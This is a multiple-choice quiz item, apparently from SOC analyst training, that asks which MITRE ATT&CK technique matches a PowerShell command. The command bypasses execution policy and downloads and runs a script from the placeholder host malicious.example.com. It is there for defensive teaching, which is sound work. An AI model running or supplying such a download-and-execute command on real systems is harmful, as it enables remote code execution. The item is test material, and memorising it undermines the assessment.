# **Challenge 1.8.2: MITRE ATT&CK Framework (Basics)**

---

### **description:**

🔍 As a Level 1 SOC Analyst, you come across the following PowerShell command during an investigation:

---
```plaintext
powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/script.ps1')"
```
🤔 Question:

Identify the MITRE ATT&CK technique associated with the execution of this PowerShell command.

🔘 ```A. T1059.001 - PowerShell```

🔘 ```B. T1105 - Remote File Copy```

🔘 ```C. T1041 - Exfiltration Over Command and Control Channel```

🔘 ```D. T1021.001 - Remote Services: Remote Desktop Protocol```

💡 Hint: Analyze the purpose and functionality of the PowerShell command to determine the relevant MITRE ATT&CK technique.

🚀 Ready to answer? Go on and make your choice!